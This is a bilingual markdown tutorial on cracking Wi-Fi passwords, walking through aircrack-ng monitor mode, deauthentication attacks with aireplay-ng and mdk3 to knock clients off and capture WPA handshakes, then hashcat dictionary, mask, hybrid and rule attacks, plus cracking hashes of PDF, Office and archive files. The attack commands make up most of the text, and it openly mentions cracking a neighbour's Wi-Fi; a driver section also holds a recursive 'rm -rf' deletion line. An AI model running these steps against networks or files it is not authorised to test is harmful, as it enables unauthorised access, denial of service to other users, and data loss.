# [Wifi_Hacking](https://bbs.ichunqiu.com/thread-21342-1-1.html)
## a video('kali linux airmod-ng + hashcat.mp4')
## 一. 抓包
0. 为了保证aircrack套件在运行的时候不被其他进程所干扰,我们需要先执行以下命令
`airmon-ng check kill`
![airmon-ng_check_kill](airmon-ng_check_kill.png)
1. 首先开启网卡的监听模式
可以看到,当前网卡默认还处在管理模式,这时我们需要手动将其变成监听模式,这样才能进行正常的抓包
`iwconfig` 使用此命令可查看无线网卡的当前工作模式
![iwconfig](iwconfig.png)
`airmon-ng start 网卡接口(wlan0)`
![开启网卡监听](开启网卡监听.png)
如果在运行此命令后为发现interface，则说明现有无线网卡不支持监听模式，需要购买支持监听模式的网卡如RTL8187等。
![airmon-ng_start](airmon-ng_start.png)
执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看。
`iwconfig` 再次查看无线网卡工作模式是否真的已经改过来了
![iwconfig_again](iwconfig_again.png)
![ifconfig](ifconfig.png)
另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon
2. 扫描附近无线情况
,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”目标无线必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方的某个在线客户端蹬掉线,才能截获他的握手包
`airodump-ng wlan0mon`
![扫描附近网络](扫描附近网络.png)
我们要测试的wifi名称是YJS，我用我的手机连上去，有设备就好抓握手包了。我们想办法让我的手机掉线，然后再重新连接时抓取握手包，跑包就可以了。
3. 单独监听目标wifi，准备抓取握手包
单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码
 * `airodump-ng --bssid DC:EE:06:96:B7:B8 -c 6 -w sec wlan0mon` 监听目标无线,并把截获到的数据写到指定文件中
     ![单独监听](单独监听.png)
 * `airodump-ng --bssid EC:26:CA:33:E1:B6 -c 6 -w testap wlan0mon`
   参数说明： --bssid 目标AP MAC
   -c 目标AP所在信道
   -w 握手包保存的文件名
   ![准备抓包](抓包.png)
 * `airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon`
  ![抓取目标连接信息](抓取目标连接信息.png)
???fixed channel always changing???
4. 使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包(用minidwep-gtk长时间一般也可以抓到包）
??? `aireplay` and `mdk3` will cause ubuntu crash, or the `airodump-ng` causes it.???
发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定
通过aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。
 * `aireplay-ng -0 10 -a EC:26:CA:33:E1:B6 -c C0:EE:FB:E9:9D:7C mon0` (此种方法在虚拟机上运行时会造成系统崩溃）
  参数解释： -0 Deautenticate攻击模式 0代表无限次（是数字）
  -a 目标ap的mac
  -c 客户端网卡mac
  发起攻击后我们可以看到客户端的帧（Frames）迅速增加
  ![断开客户端获取抓包](断开客户端获取抓包.png)
  得到的握手包：
  ![得到握手包](得到握手包.png)
 * `sudo mdk3 mon0 d -n B8:F8:83:76:92:69 -c 9` ([install & use mdk3](#mdk3))
    运行完这个命令出现`Network is down`之后马上在minidwep上点“Launch”即可抓到包。
    比如你要用mdk3 mon0 d -c 命令:
    那就要先添加黑名单或者白名单，-c后面是信道，添加白名单的话不会攻击白名单mac或者添加黑名单mac只攻击这个ssid
    如`echo mac地址 > withelist`
    `mdk3 mon0 d -w withelist -c 11`，这样信道11的ssid除了白名单外都会被攻击
    此方法也适用于reaver一直重复一个pin情况，可以让客户端重启路由器。
 * `aireplay-ng --deauth 15 -a DC:EE:06:96:B7:B8 wlan0mon`
     ![aireplay-ng](aireplay-ng.png)
     可以看到,这时握手包已被正常抓获,此时监听也就可以断开了,注意观察终端的右上角,那个带有handshake标志的就是握手包的意思
     ![got handshake](got_handshake.png)
5. 抓包成功后ctrl+C即可结束抓包。
停止监听模式
`airmon-ng stop wlan0mon`
## 二. 把cap转换成hccap
* 用aircrack-ng
`aircrack-ng <out.cap> -J <out.hccap>`
这个就不用细说了吧，第一个是cap第二个是转换后得到的hccap文件。
![把cap转换成hccap](把cap转换成hccap.png)
* https://hashcat.net/cap2hccapx/
* cap2hccapx
    * install
        `cd ~`
        `wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c`
        `gcc cap2hccapx.c`
        `mv <out_file> /bin/cap2hccapx`
        `rm cap2hccapx.c`
    * usage
        `cap2hccapx input.pcap output.hccapx [filter by essid] [additional network essid:bssid]`
## 三. 跑包
在我们抓获握手包以后,接下来的事情就非常简单了,你可以直接用aircrack加载弱口令字典进行爆破,当然,个人是十分不建议用字典(效率,实用性,太低,过于浪费时间),推荐大家直接把包处理一下丢给hashcat或者某宝去跑就行了
* `aircarck-ng -a 2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap`
    * -a2代表WPA的握手包
    * -b指定要破解的wifi BSSID。
    * -w指定字典文件
    * 最后是抓取的包
        ![result](result.png)
    利用aircrack加载字典进行爆破,反正我自己很少用,基本没用过,先不说速度如何,关键还是看你的字典是否靠谱,实际测试中,个人并不建议用,因为根本没有靠谱性可言,因为这里仅仅是测试,实际渗透中,哪有太多的时间让你去跑[比如,实地渗透]
* `hashcat -m 2500 testap.hccapx pass.txt`
使用hashcat命令，第一个参数： -m 2500为破解的模式为WPA/PSK方式 ，第二个参数： hccap格式的文件是刚刚转化好的文件， 第三个参数：pass.txt为字典文件 :
新版的hashcat要用`.hccapx`格式，可以在`https://hashcat.net`里convert
![用hashcat破解WPAPSK密码](用hashcat破解WPAPSK密码.png)
破解的结果：
![破解结果](破解结果.png)
## [Hashcat 说明](https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/)
### need to be solved
  * install intel opencl sdk，速度太慢，查看hashcat硬件及驱动要求
      * Intel's OpenCL runtime (GPU only) is currently broken
      * `--gpu-accel 160` not working
      * `-D 1,2,3` not working properly
      * too slow
      * cpu报错
  * Outdated or broken Intel OpenCL runtime detected!
### how to install OpenCL drivers
#### for intel cpu
##### requirements
Intel CPUs require "OpenCL Runtime for Intel Core and Intel Xeon Processors" (16.1.1 or later)
##### how to install/reinstall
1. Completely uninstall the current driver
 * Windows: use software center
 * Linux:
   * NVIDIA: nvidia-uninstall
   * AMD: amdconfig --uninstall=force
   * If you installed the driver via a package manager (Linux), then you need to remove these packages too
   * Make sure to purge those package, not to just uninstall them
2. Reboot
3. For Windows only: download and start Driver Fusion (free version is enough; select “Display”, AMD/NVidia/Intel, ignore the warning about Premium version), then Reboot
4. Make sure that no Intel OpenCL SDK, AMD-APP-SDK or CUDA-SDK framework is installed – if it is installed, uninstall it!
5. For Windows only: manually delete remaining OpenCL.dll, OpenCL32.dll, OpenCL64.dll files on all folders. You should find at least 2. They usually reside in “c:\windows\syswow64” and “c:\windows\system32”. This step is very important!
6. For Linux only:

        dpkg -S libOpenCL to find all packages installed that provide a libOpenCL, then purge them
        find / -name libOpenCL\* -print0 | xargs -0 rm -rf
7. Reboot
8. For Linux only: apt-get install ocl-icd-libopencl1 opencl-headers clinfo
9. Install the driver recommended on https://hashcat.net/hashcat/. If it says *exact* it means exact.
    For AMD GPUs, see ROCm instructions here.
10. Reboot
11. For Linux only: rm -rf ~/.hashcat/kernels
12. Reinstall hashcat, choose:
    * Stable version: Download and extract (under Linux, make sure to use: “7z x” to extract) the newest hashcat from https://hashcat.net/
    * Beta version: https://hashcat.net/beta/
    * Development version: git clone https://github.com/hashcat/hashcat
13. For Linux only: try to run “clinfo” first in your terminal
14. Try to run hashcat --benchmark
##### the file used for intel cpu
./opencl_runtime_16.1.2_x64_setup.msi
#### for intel gpu
##### requirements
* Intel GPUs on Windows require "OpenCL Driver for Intel Iris and Intel HD Graphics"
* Intel GPUs on Linux require "OpenCL 2.0 GPU Driver Package for Linux" (2.0 or later)
##### how to install
Intel has great OpenCL support on Windows, but no support on Linux. Intel's OpenCL SDK for Linux supports only CPU.
Since hashcat is programmed on Linux (and afterwards cross-compiled for windows) there's no chance yet to getting this work.
GPUs are not magic go-fast devices. The microarchitecture and ISA have to be well-suited for the task at hand. As it stands, Intel GPUs have very minuscule raw compute power, and their ISA is not optimal for password cracking. Most modern-day CPUs with XOP or AVX2 support will be faster than an Intel GPU.
For Windows, when you install or update the graphics driver (Windows update, downloadcenter.com, etc.), the additional libraries needed to run Media SDK and OpenCL applications are included.
##### Intel's OpenCL runtime (GPU only) is currently broken
First, use this http://www.intel.com/content/www/us/en/support/detect.html to update or reinstall your intel gpu driver.
Second, add `--force` to your para.
### 基础知识
* What is a hash?
Hash is a One-way function (non-reversible) that takes an input string and outputs a string of a fixed length. There are plenty of hash functions that maybe you are probably familiar with some of the common ones are md5, various versions of SHA, NTLM, WPA, and numerous others.
![speed to generate hashes of various hash algorithms](speed_to_generate_hash_of_variouus_hash_algorithms.jpg)
* Approaches to crack a hash
    * using dictionary
        One is to enumerate candidate strings and what I mean by that is taking a list of these strings that you want convert via hashing algorithm, and then match that hash after the algorithm output with with the hash that you're trying to essentially determine the plaintext counterpart to. So, you take some strings, and you convert them through a hashing algorithm, you look at the output and you see if the hashing output matches any o the hashes that you want to decipher.
    * using rainbow
        The second options is to use pre-computation. You may heard of something called rainbow tables which is a version of that what that involves is essentially doing all the pre-computation of the hashes of the candidate strings in advance which can take up a tremendous amount of storage space but as we know storage space is relatively cheap these days and so instead of doing work as you go you have these pre-computed tables you simply take the hash that you want to determine the plain text of and it looks up in the pre-computed table to see if it exists within that particular file set or database. So you could have billions of pre-computed hashes and simply do a lookup that can just take a matter of seconds.
实际情况一般是这样的：破解者从某些渠道搞到了一大批用户名和hash后的密码，然后打算破解出原始密码，这样就能直接拿来登录网站了。
hash也叫哈希函数或散列函数，就是把你的原始密码拆散组合计算后变成一大串乱码，肉眼绝对看不出来原来是什么内容，常用的hash算法有md5、sha1、sha256等。
假如你的密码是“123456”，那么它md5的结果就是“e10adc3949ba59abbe56e057f20f883e”。
而且只要原文稍有变动，md5结果就会彻底变化。
比如“123455”的md5结果是“00c66aaf5f2c3f49946f15c1ad2ea0d3”，跟上面的没有半个字相同。
网站的数据库里不会存放你的“123456”，只会存这堆字符，就算被人把整个数据库拖走，也没法直接拿你的用户名和密码登录网站，必须要进行破解。

而且所有的hash都有个特点，就是无法反推出原文。道理很简单，比如md5的长度是固定的32位，所以它的数量是有限的，而原文要多长有多长，数量是无限的，从个位数到几十G的大文件都能hash成32位的字符串。有限个对上无限个，总会有重复，所以理论上hash无法真正破解，因为一段密文对应了无数原文。但反过来想，只要找到这无数原文中的任何一个，就等于找到原始密码了。
假设我得到了某段md5密文，经过数百上千亿次尝试后终于试出某个字串，它的md5结果也是这段密文，这种“破解”方法的学名叫碰撞（collision）。而碰撞出来的字串此时等同于原始密码。

上面说的“每秒80亿”，其实就是oclHashcat-plus用暴力破解时计算hash的最高速度，它用的是显卡GPU不是CPU，因为现在显卡的性能比CPU强多了。
看上去快得吓人，实际没那么厉害，要知道8位大小写英文加数字的密码一共有多少种？
（26+26+10）的8次方，2183401亿。每秒80亿次的话，7.5小时才能试完一个。
密码长度加一位，时间至少增长62倍。如果密码里还有各种字符，那时间就更长了。
想想55位的密码要多久才能破？还没算到百万分之一，想登录的网站都倒闭了。


不过且慢，尽管暴力破解要费很长时间，这并不代表你的账户密码从此安全了，黑客也没那么蠢，只会傻乎乎地一个个硬算密码，人家有的是方法：

* 字典：绝大部分普通用户的密码简单得令人发指，纯数字、生日、名字、单词、拼音……把这些东西排列组合在一起，做成一个密码字典，计算量比直接暴力破解少了几个数量级。某人拿到了100万个hash，假如纯暴力破解要一年，那用字典可能两小时就破解出了80万个，剩下的可以整理出来再去用别的方法破，反正手头已有的80万个账号密码想干啥干啥。
* 彩虹表：毕竟不是什么密码都能放到字典里，稍微复杂的就不行了，最终还是得靠暴力。有人想出了提升效率的方法，就是空间换时间，不用你一个个当场hash，而是提前算好，存到一张巨大的表里，破解时只查不计算，速度有了极大飞跃。使用彩虹表进行破解，普通PC也能达到每秒1000亿次以上的惊人速度。
   而且许多网站为了增加安全性，不会简单地做一次md5就保存到数据库。比如md5后再md5一次；或者在原始密码前后补上一串字符，增加密码长度后再hash，学名叫加盐（salt）；这些算法的结果都可以加入彩虹表中。网上公开了数百G的彩虹表供下载，花一星期下载它比自己花几个月算出来可合适多了。最完善的彩虹表差不多能破解出目前网上99.9%的密码。
* 高性能电脑和集群：前面说的每秒80亿次是一块顶级显卡的速度，但最新版oclHashcat-plus已经支持最多128个显卡核心。这张图是Hashcat团队的电脑，计算核心是8块HD7970显卡，总价上万美元：
    ![PC with 8 HD7970 graphic cards](pcwith8HD7970GraphicCards.jpg)
它的速度有多快？反正我尝试用自家电脑运行oclHashcat-plus暴力破解一个8位的、字母数字符号混合的密码预计需要29天，而这台只需要不到12小时。
但它再强也只是单台电脑，顶级黑客拥有的集群计算资源包括肉鸡等等，辅以前面讲到和没讲到的各种算法，破解几千万甚至上亿的密码并不难想象。另一个问题如何分析《中国黑客传说：游走在黑暗中的精灵》文章内容的真实性？中提到顶级黑客手中有十几亿条账号密码、用云计算破解hash，虽然我不认识人家，但这些技术的可行性当然是确凿无疑的。
* 上面说的都是黑客一方拖走别人数据库后进行的破解，要知道，拖库本来就是通过漏洞和入侵才能进行的。如果服务器安全做得好，黑客很难拿到用户数据；但如果网站方自己不上心，后门漏洞一大堆，四五流的黑客都能在里面逛大街，那你的账号密码基本上就难保贞操了。
甚至有更愚蠢的事件：比如前两年CSDN论坛900多万用户数据泄露，密码居然是明文存储、连一次hash都没做——这件事实在颠覆我的世界观，要知道它可是个程序员网站——遇到这种事，只好自认倒霉，去别的网站改掉同一个密码吧。
* 对了最后再说一点，如果不是专业黑客，那oclHashcat-plus的最大作用之一可能是破解邻居的wifi密码……它绝对比某些一键式破解工具快，缺点是你得自己抓wpa握手包。
* habits of passwords
    * Many people are going to capitalize the first character
    * append numbers at the end of the string
* websites of leaked passwords
    * RockYou-32.6M plaintext
    * eHarmony-1.5M unsalted MD5
    * LinkedIn-6.5 unsalted SHA1
    * Gawker-1.3M unsalted DES
### requirements
* AMD GPUs on Linux require "RadeonOpenCompute (ROCm)" Software Platform (1.6.180 or later)
* AMD GPUs on Windows require "AMD Radeon Software Crimson Edition" (15.12 or later)
* Intel CPUs require "OpenCL Runtime for Intel Core and Intel Xeon Processors" (16.1.1 or later)
* Intel GPUs on Linux require "OpenCL 2.0 GPU Driver Package for Linux" (2.0 or later)
* Intel GPUs on Windows require "OpenCL Driver for Intel Iris and Intel HD Graphics"
* NVIDIA GPUs require "NVIDIA Driver" (367.x or later)
### Install
* install on ubuntu

        git clone https://github.com/hashcat/hashcat.git
        cd hashcat
        git submodule update --init --recursive
        sudo make
        sudo make install
* install on windows
Hashcat的强大破解能力依赖于显卡的GPU浮点运算，建议直接在物理机上安装Kali和显卡驱动。Kali安装显卡驱动，参考Kali官方教程，双显卡安装显卡驱动遇到黑屏参考这篇文章解决。VMware虚拟机中hashcat也可以使用CPU运行，只是破解速度远远低于GPU破解。也可以在主机windows上使用hashcat
  * 首先要安装最新的显卡驱动
  * 然后下载hashcat的binary
  * 然后cmd，管理员运行，拖拽hashcat的64位exe运行
  * 其他文件也可以拖拽，如字典文件，破解结果等。
### 先介绍几个相对比较好用的在线hash破解站
* cmd5.com
* www.objectif-securite.ch
* 淘宝
* `findmyhash md5 -h ff9830c42660c1dd1942844f8069b74a`
### 使用hashcat前的一点点准备工作
务必保证已经事先装好对应的显卡驱动看官网这情况,最新版的hashcat除了增加了一些新的散列类型之外,貌似也已经不再区分AMD和英伟达显卡了,如果你用的是旧版本的hashcat,请根据自己实际的显卡类型来选择对应版本的hashcat,之后再到其官方站点把hashcat down下来,注意,直接解压即可运行,无需再额外装任何东西,用什么系统就运行对应系统的可执行程序即可实际破解中,更推荐用linux,可能就是装驱动稍微有点儿麻烦,不过还好啦,如果实在搞不定,在win下跑也是一样的,本来想用显卡给大家演示的,没办法,家里的电脑,集成显卡没钱,无奈,大家谅解哈,所以,下面就直接全部用kali自带的hashcat来演示了,不同类型的hashcat,单就用法来讲,其实也没啥太大区别,实际使用中建议还是自己买块好点儿的显卡跑,如果真有条件很显然,本人是个穷逼GPU矩阵也是可以考虑的.
`https://hashcat.net/files/hashcat-3.6.0.7z`
### 关于hashcat的一些常用选项
如果在kali中提示要升级到新版本[kali2.x可能会出现这样的情况],请把系统时间修改到2010年之前即可,这里就只说几个最常用的选项,关于其它的各种小选项,因为自己实际中用的比较少,如果大家万一用到,扫一眼帮助即可,篇幅原因这里就只捡最核心的说了
* `-a`: for the type of attack,指定要使用的破解模式
* `-m`: for the type of hash,指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法
* `-o`: 指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中
* `--force`: 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项
* `--show`: 显示已经破解的hash及该hash所对应的明文
* `--increment`: 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长
* `--increment-min`: 密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用
* `--increment-max`: 密码最大长度,同上
* `--outfile-format`: 指定破解结果的输出格式id,一般自己常用`3`
* `--username`: 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到
* `--remove`: 删除已被破解成功的hash
* `-r`: 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的
### 不同破解模式下的具体工作细节
* `0`: Straight.最简单的纯粹基于字典的爆破模式,后面可以连续跟上多个字典文件,破解的成功与否最终还是取决于字典质量,在几乎同等的破解时间里,是我我肯定不会先选它的,简单跑一些弱口令什么的,还是可以的,话说回来,如果只是跑些弱口令,大可不用hashcat,未免有些大材小用了,不是吗
* `1`: Combination. 一种相对智能高效的爆破模式,它的意思是这样的,如果你事先已经明确知道密码中可能包含哪些字符串,你可以把那些字符串事先写到文件中,每行对应一个字符串,然后hashcat会自动根据你所提供的这些字符串,尝试所有可能的组合进行猜解
* `3`: Brute-force. 基于纯掩码的爆破方式,如果你有需求要大批量爆破hash,可能会用到,后面我们会用绝大部分的篇幅来说它,这里需要稍微注意下,你给定的掩码是多少位它就只破解多少位,比如,你给的是7位的掩码,它就只跑7位这么长,它可能并不是你想象的那样,是从1位一直跑到第7位这样自动轮询,如果你想让它自动变长跑,启用increment模式指定密码的最小和最大长度即可,之前理解的有点儿错,也是看官方的wiki才知道的,汗…
* `6`: Hybrid Wordlist + Mask. 基于字典和掩码配合的爆破模式,它的破解过程其实也比较简单,就是每次从前面的字典中取出一个字符串然后和后面掩码的所有组合进行拼接,直到撞到对应的明文
* `7`: Hybrid Mask + Wordlist.  基于掩码和字典配合的爆破模式,跟6的过程正好相反,只不过这次它是从前面进行拼接
### 不同的掩码所表示的具体字符及掩码字符集规则使用样例:
掩码是个非常灵活的东西,你可以把它放到任何你想放的位置上,甚至,你愿意的话,也可以把自己想跑的一些掩码规则都事先放到一个文件中,然后以.hcmask命名,加载就可以让hashcat自动跑了,这样用起来比较方便,省的后期经常需要人为干预,后续会为大家简单演示下
* `l`: abcdefghijklmnopqrstuvwxyz 纯小写字母
* `u`: ABCDEFGHIJKLMNOPQRSTUVWXYZ 纯大写字母
* `d`: 0123456789					纯数字
* `h`: 0123456789abcdef				常见小写子目录和数字
* `H`: 0123456789ABCDEF				常见大写字母和数字
* `s`:  !"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~		特殊字符
* `a`: ?l?u?d?s					以上所有字符
* `b`: 0x00 - 0xff					可能是用来匹配像空格这种密码的
#### An example of `.hcmask`
`cat test.hcmask`

        ?u?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
        ?u?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l1106?d?d?d?d?s?s
run `hashcat -a 3 -m 11300 dash.hash test.hcmask -o cracked.txt --session test1`
### Examples
* `?l?l?l?l?l?l?d?d?d?d`: 表示6位小写子目录4位数字组成的密码,注意这里的位置全部都是一一对应的
* `de?l?d?s56pos`: 表示由de加一位小写字母加一位数字加一位特殊字符后面跟上56pos组成的密码
#### 自定义字符集规则
* `-1 ?l?s ?1?1?1?1?1`: 表示五位由特殊字符和小写字母组成的密码
* `-1 ?d?l -2 ?d?l?u -3 ?l?u ?1?2?3`: 表示密码的第一位可能是小写字母或者数字,第二位可能是大小写字母或者数字,第三位可能是大或小写字母
### 不同破解模式下的具体应用场景,用的时候需要稍微注意下语句格式(暂以破解最普通的md5 hash为例)
#### 基于纯字典的爆破模式 Straight:
`hashcat --force -a 0 -m 0 hash.txt /home/weak_wordlist/pass/weakpass.txt -o res.txt`
`cat res.txt`
![纯字典straight模式](straight.png)
for multiple dictionaries in one folder:
`hashcat -a 0 -m 2500 cap.hccapx path/to/dictionaries/folder`
#### 稍微智能一些的字典爆破模式,需要事先把密码中有可能包含到的单词都放到字典中 Combination
比如,我有两个这样的字典,字典包含如下的字符串,而我的实际密码是adminpass [ 字典文件可同时有很多个,不过那也意味你的组合也会特别多,速度就会慢 ],实际破解就可以像下面就这样写
`cat dic1.txt dic2.txt`
![combination dic](combination_dic.png)
`hashcat --force -a 1 -m 0 hash.txt dic1.txt dic2.txt`
![combination result](combination_res.png)
##### Combinator Attack
##### Description
Each word of a dictionary is appended to each word in a dictionary.
##### Input
If our dictionary contains the words:

        pass
        12345
        omg
        Test
##### Output
Hashcat creates the following password candidates:

        passpass
        pass12345
        passomg
        passTest
        12345pass
        1234512345
        12345omg
        12345Test
        omgpass
        omg12345
        omgomg
        omgTest
        Testpass
        Test12345
        Testomg
        TestTest
##### Combinator Attack
Using the Combinator Attack within hashcat (not standalone version of Combinator Attack).
The command for the Combinator Attack in hashcat is `-a 1`
You need to specify **exactly** 2 dictionaries in your command line: e.g.
`./hashcat64.bin -m 0 -a 1 hash.txt dic1.exe dic2.txt`
If you wish to add rules to either the left or right dictionary or both at once then you can use the `-j` or `-k` commands.
`-j`, `--rule-left=RULE`        Single rule applied to each word on the left dictionary
`-k`, `--rule-right=RULE`       Single rule applied to each word on the right dictionary
Example.
Dictionary 1

        yellow
        green
        black
        blue

Dictionary 2

        car
        bike
Commands

        -j '$-'
        -k '$!'
Note: the quotes are only there to escape the `$` character which would otherwise allow `$-` to be interpreted as a variable. The rules that are used here are still just `$-` and `$!`. Escaping might not work exactly the same way on each operating system and with each shell interpreter (if you are unsure about what needs to be escaped and how it should be escape, please consider looking up your OS and/or shell interpreter manual).
The output would be

        yellow-car!
        green-car!
        black-car!
        blue-car!
        yellow-bike!
        green-bike!
        black-bike!
        blue-bike!

#### 基于纯掩码的爆破模式,其实就是尝试逐个位破解,一般人的密码设置习惯大都是基于大小写字母数字这种形式的,如果hash实在比较多,可以尝试从指定的位数开始一位位的将大小写特殊字符轮询这跑,可以节省一些时间 [Brute-force]
* 破解九位纯小写字母组成的密码hash,可以看到在我双CPU双核的虚拟机中破解这种只是两三分钟的事情
`hashcat --force -a 3 -m 0 hash.txt ?l?l?l?l?l?l?l?l?l`
![Brute-force_9l](brute-force-9l.png)

* 前三位小写字母,后四位数字
`hashcat --force -a 3 -m 0 hash.txt ?l?l?l?d?d?d?d`
![brute-force-3l4d](brute-force-3l4d.png)


* 10位纯数字,其实大家都很清楚,底层对数字的处理速度是最快的
    `hashcat --force -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d?d?d`
    ![brute-force-10d](brute-force-10d.png)

* 7位小写字母加数字的随机组合
    `hashcat --force -a 3 -m 0 hash.txt -1 ?l?d ?1?1?1?1?1?1?1`
    ![brute-force-71](brute-force-71.png)

#### 除了上面这种常规的掩码写法,你也可以这样,比如,你明确的知道密码的某一位或者几位上可能是什么字符,你也可以这样写掩码,假设密码明文为loveshare,你实际破解的掩码就可以这样写,它只会去破解有掩码的位,速度自然就非常快了
`hashcat --force -a 3 -m 0 hash.txt ?l?lve?l?la?l?l`
![brute-force-loveshare](brute-force-loveshare.png)

#### 基于字典和掩码配合的爆破模式,把可能存在的字符串事先写到字典中,然后hashcat在破解的时候会把后面所有的掩码组合跟前面的字典每行中的字符串进行拼接,直到猜解出明文,下面也是一样,只不过下面是把掩码放在了前面字典放在了后面`Hybrid Wordlist + Mask`,其实,它想表达的意思非常简单,如
dic1.txt 中的内容是这样的
admin
root
...
实际的明文密码是这样的
`adminpass123`
那你实际破解的掩码,就可以这样写
`hashcat --force -m 0 hash.txt -a 6 dic1.txt -1 ?l ?l?1?1?1?d?d?d`
![hybrid wordlist + mask](hybrid wordlist + mask.png)
其实,它实际的拼接过程就相当于下面这样,直到最后就会撞到adminpass123
`admin?1?1?1?1?d?d?d`
`pass?1?1?1?1?d?d?d`
#### 下面是多字典实例
`hashcat --force -m 0 hash.txt -a 6 dic1.txt dic2.txt -1 ?l ?l?1?1?1?d?d?d`
![hybrid wordlist + mask+muludic](hybrid wordlist + mask+muludic.png)
#### 基于掩码和字典配合的爆破模式 [Hybrid Mask + Wordlist]:
`hashcat --force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt`
![hybrid mask + wordlist](hybrid mask + wordlist.png)
#### 基于increment的自动变长模式,下面的意思就表示自动破解4到8位由小写子目录和数字组成的密码hash:
`hashcat --force -a 3 -m 0 hash.txt --increment --increment-min=4 increment-max=8 -1 ?l?d`
![increment](increment.png)
#### Using rules
Hashcat has a built-in function for writing custom scripts for modifying each line in a wordlist automatically. For example, say you have a wordlist with only the word "password" in it. Running a rule against this file might make hashcat first try "password", then try "password1", then try "password123", etc. The variations are dependent on the rules written in the rules file.
Luckily, you don't have to be a master at writing rules files in order to utilize them. Like wordlist, Kali comes with a bunch of rules that are built in. The most famous one of these has 64 different modifier variations built in and is called _base46.rule_. The Windows syntax for this rule is as follows:
`hashcat64 -m2500 -r rules\base64.rule -o cracked capturefile-01.hccapx rockyou.txt`
Again, mind the syntax. This assumes that the base64.rule file is in a subdirectory called *rules*, and the *capturefile-01.hccapx* and *rockyou.txt* file are jin the working directory. Relative and absolute paths can be used in either Linux or Windows for any of these parameters. Also keep in mind that if you are applying 64 variations to each password in the list, that running this command with the rule applied that applies base64.rule is going to take 64 times longer than just running the wordlist alone.
#### 破解 wpa/wpa2 握手包中的无线密码hash [可能需要你自己先把握手包用wpaclean整理一下,再用aircrack输出成hashcat认识的散列格式,非常实用,具体内容请查看无线破解相关文章]:
`hashcat -a 3 -m 2500 wpahash.hccap ?l?l?l?l?l?l?l?l`
#### 破解Adobe PDF 11文件密码hash,后面针对这种包公套件的加密破解,都需要自己先把hash提取出来,在john基本都有对应的hash提取脚本,可直接用,后续我们再说,下面几种类型的破解有几个还有一些问题,不过,我们后面用john来搞就好了
`hashcat --force -m 10700 hash.txt -a 3 ?d?d?d?d?d?d`
#### 破解 Office 2013 文件密码hash:
`hashcat --force -m 9600 hash.txt -a 3 ?d?d?d?d?d?d`
#### 破解 RAR5压缩文件密码hash:
`hashcat --force -m 13000 hash.txt -a 3 ?d?d?d?d?d?d`
#### 破解 7-Zip压缩文件密码hash:
`hashcat --force -m 11600 hash.txt -a 3 ?d?d?d?d?d?d`
#### 破解 WinZip压缩文件密码hash:
`hashcat --force -m 13600 hash.txt -a 3 ?d?d?d?d?d?d`
### Rule-based Attack
#### Description
The rule-based attack is one of the most complicated of all the attack modes. The reason or this is very simple. The rule-based attack is like a programming language designed for password candidate generation. It has functions to modify, cut or extend words and has conditional operators to skip some, etc. That makes it the most flexible, accurate and efficient attack.
#### Why not stick to regular expressions
Why re-invent the wheel? Simple answer: regular expressions are too slow. Typically we have to generate 1,000,000,000 (or more) fresh password candidates in less than 10 ms before hashing algorithms start to become idle, and then again and again, second after second. Just take a look at your GPU speed display to get an idea of it.
#### Compatibility to other rule engines
